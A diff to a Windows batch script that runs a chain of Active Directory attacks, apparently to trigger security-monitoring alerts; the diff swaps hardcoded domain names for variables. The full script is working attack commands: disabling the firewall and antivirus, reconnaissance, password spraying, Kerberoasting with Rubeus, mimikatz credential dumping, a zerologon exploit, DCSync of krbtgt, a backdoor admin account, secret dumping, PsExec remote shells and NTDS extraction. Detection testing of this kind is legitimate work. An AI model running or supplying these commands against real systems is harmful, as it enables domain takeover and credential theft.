@@ -4,10 +4,14 @@ echo You are about to perform a series of attack techniques. Press Y to Continue
 choice /c YN
 rem if %errorlevel%==2 goto no
 
+rem **Set your variable (PUT YOUR DOMAIN CONTROLLER AND DOMAIN NAME HERE)
+set mydc=dc1.corp.contoso.com
+set mydom=corp.contoso.com
+
 mkdir c:\temp
 cd c:\temp
 
-rem **Turn off firewall and antivirus
+rem **Turn off firewall and antivirus 
 netsh advfirewall set allprofiles state off
 powershell.exe -Command "Add-MpPreference -ExclusionPath 'c:\temp'"
 powershell.exe -Command "Set-ExecutionPolicy unrestricted"
@@ -21,12 +25,12 @@ powershell.exe -Command "Invoke-WebRequest -Uri 'https://github.com/threatspeak/
 TIMEOUT /T 3
 powershell.exe .\DisableNotifications.ps1
 
-rem **Network-mapping reconnaissance (DNS) (PUT YOUR DOMAIN CONTROLLER AND DOMAIN NAME HERE)
-(Echo server DC1.corp.contoso.com & Echo ls -d corp.contoso.com)|NSLOOKUP
+rem **Network-mapping reconnaissance (DNS) 
+(Echo server %mydc% & Echo ls -d %mydom%)|NSLOOKUP
 TIMEOUT /T 120
 
 rem **User and IP Address reconnaissance (PUT YOUR DC NAME HERE)
-NetSess.exe DC1.corp.contoso.com
+NetSess.exe %mydc%
 TIMEOUT /T 120
 
 rem **Directory Service Enumeration
@@ -56,22 +60,22 @@ powershell.exe "([adsisearcher]'(&(objectCategory=computer)(!(primaryGroupID=516
 powershell.exe "Get-Content -Path .\accounts.txt"
 TIMEOUT /T 120
 
-rem **Account enumerations Reconnaissance. (PUT YOUR DOMAIN HERE)
-powershell.exe -Command " & {Import-Module .\adlogin.ps1; adlogin users.txt corp.contoso.com P@ssw0rd!}"
+rem **Account enumerations Reconnaissance
+powershell.exe -Command " & {Import-Module .\adlogin.ps1; adlogin users.txt %mydom% P@ssw0rd!}"
 TIMEOUT /T 120
 
-rem **Suspected AS-REP Roasting attack (PUT YOUR DOMAIN CONTROLLER HERE)
+rem **Suspected AS-REP Roasting attack 
 Rubeus.exe kerberoast
 TIMEOUT /T 3
 Rubeus.exe kerberoast /tgtdeleg  
 TIMEOUT /T 3
-Rubeus.exe asktgs /service:http/DC1.corp.contoso.com /ptt
+Rubeus.exe asktgs /service:http/%mydc% /ptt
 TIMEOUT /T 3
 
-rem **Suspected Brute-Force Attack (Kerberos, NTLM and LDAP) & Password Spray attack (PUT YOUR DOMAIN HERE)
+rem **Suspected Brute-Force Attack (Kerberos, NTLM and LDAP) & Password Spray attack
 wmic useraccount get name >domainusers.txt
 TIMEOUT /T 10
-powershell.exe -Command " & { Import-Module .\adlogin.ps1; adlogin domainusers.txt corp.contoso.com P@ssw0rd}"
+powershell.exe -Command " & { Import-Module .\adlogin.ps1; adlogin domainusers.txt %mydom% P@ssw0rd}"
 TIMEOUT /T 120
 
 rem **Dump Credentials In-Memory
@@ -79,37 +83,37 @@ certutil.exe -decode mimikatz.txt mimikatz.exe
 mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit" >victimcpc.txt
 TIMEOUT /T 120
 
-rem **Malicious request of Data Protection API (DPAPI) master key (PUT YOUR DC HERE)
-mimikatz.exe "privilege::debug" "lsadump::backupkeys /system:DC1.corp.contoso.com /export"  "exit"
+rem **Malicious request of Data Protection API (DPAPI) master key 
+mimikatz.exe "privilege::debug" "lsadump::backupkeys /system:%mydc% /export"  "exit"
 TIMEOUT /T 120
 
-rem **Suspected Netlogon privilege elevation attempt (PUT YOUR DC AND DOMAIN HERE)
-mimikatz.exe "privilege::debug" "lsadump::zerologon /target:DC1.corp.contoso.com /account:dc1$ /exploit"  "exit"
+rem **Suspected Netlogon privilege elevation attempt (PUT YOUR DCACCOUNT HERE> IT SHOULD BE IN THE P)
+mimikatz.exe "privilege::debug" "lsadump::zerologon /target:%mydc% /account:dc1$ /exploit"  "exit"
 TIMEOUT /T 120
 
-rem **Suspected DCSync attack (replication of directory services) (PUT YOUR DOMAIN HERE)
-mimikatz.exe "privilege::debug" "lsadump::dcsync /domain:corp.contoso.com /user:krbtgt" "exit"
+rem **Suspected DCSync attack (replication of directory services) 
+mimikatz.exe "privilege::debug" "lsadump::dcsync /domain:%mydom% /user:krbtgt" "exit"
 TIMEOUT /T 120
 
-rem **Domain dominance (PUT YOUR DOMAIN CONTROLLER HERE)
-wmic /node:DC1.corp.contoso.com process call create "net user /add BadGuy pa$$w0rd1"
-PsExec.exe \\DC1.corp.contoso.com -accepteula net localgroup "Administrators" BadGuy /add
+rem **Domain dominance 
+wmic /node:%mydc% process call create "net user /add BadGuy pa$$w0rd1"
+PsExec.exe \\%mydc% -accepteula net localgroup "Administrators" BadGuy /add
 TIMEOUT /T 120
 
-rem **Dump Secrets (PUT YOUR DOMAIN CONTROLLER HERE)
-PsExec.exe -accepteula -s -d \\dc1.corp.contoso.com reg save HKLM\security\policy\secrets %temp%\secrets
+rem **Dump Secrets 
+PsExec.exe -accepteula -s -d \\%mydc% reg save HKLM\security\policy\secrets %temp%\secrets
 TIMEOUT /T 3
 exit
 TIMEOUT /T 120
 
-rem **Remote code execution attempts (PUT YOUR DOMAIN CONTROLLER HERE)
-PSExec.exe -accepteula \\dc1.corp.contoso.com cmd.exe
+rem **Remote code execution attempts 
+PSExec.exe -accepteula \\%mydc% cmd.exe
 TIMEOUT /T 3
 exit
 TIMEOUT /T 120
 
-rem **Data exfiltration over SMB (PUT YOUR DOMAIN CONTROLLER HERE and the name of a directory on your local machine to copy files to)
-PSExec.exe -accepteula \\dc1.corp.contoso.com  cmd.exe
+rem **Data exfiltration over SMB (PUT name of a directory on your local machine to copy files to)
+PSExec.exe -accepteula \\%mydc%  cmd.exe
 TIMEOUT /T 3
 NTSDUTIL "Activate Instance NTDS" "IFM" "Create Full c:\windows\mdi" "q" "q"
 TIMEOUT /T 3
@@ -122,7 +126,7 @@ exit
 TIMEOUT /T 120
 
 rem ** Cleanup ** (PUT YOUR DOMAIN CONTROLLER HERE)
-wmic /node:"DC1.corp.contoso.com" process call create "net user /delete BadGuy"
+wmic /node:"%mydc%" process call create "net user /delete BadGuy"
 del *.zip
 del *.txt
 del *.csv
